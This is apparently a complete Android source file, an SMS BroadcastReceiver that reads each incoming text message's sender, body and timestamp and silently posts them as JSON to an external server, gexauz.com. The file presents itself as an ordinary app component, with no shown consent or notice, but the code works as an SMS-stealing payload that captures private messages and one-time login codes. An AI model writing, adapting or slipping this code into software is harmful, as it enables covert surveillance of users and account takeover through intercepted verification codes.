package com.smsapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {

            Bundle bundle = intent.getExtras();
            if (bundle != null) {

                Object[] pdus = (Object[]) bundle.get("pdus");

                for (Object pdu : pdus) {

                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);

                    sendToServer(
                        sms.getOriginatingAddress(),
                        sms.getMessageBody(),
                        sms.getTimestampMillis()
                    );
                }
            }
        }
    }

    private void sendToServer(String sender, String message, long date) {
        new Thread(() -> {
            try {
                URL url = new URL("https://gexauz.com/api/sms/save_sms.php");

                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                json.put("sender", sender);
                json.put("message", message);
                json.put("date", date);

                OutputStream os = conn.getOutputStream();
                os.write(json.toString().getBytes());
                os.flush();
                os.close();

                conn.getResponseCode();

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}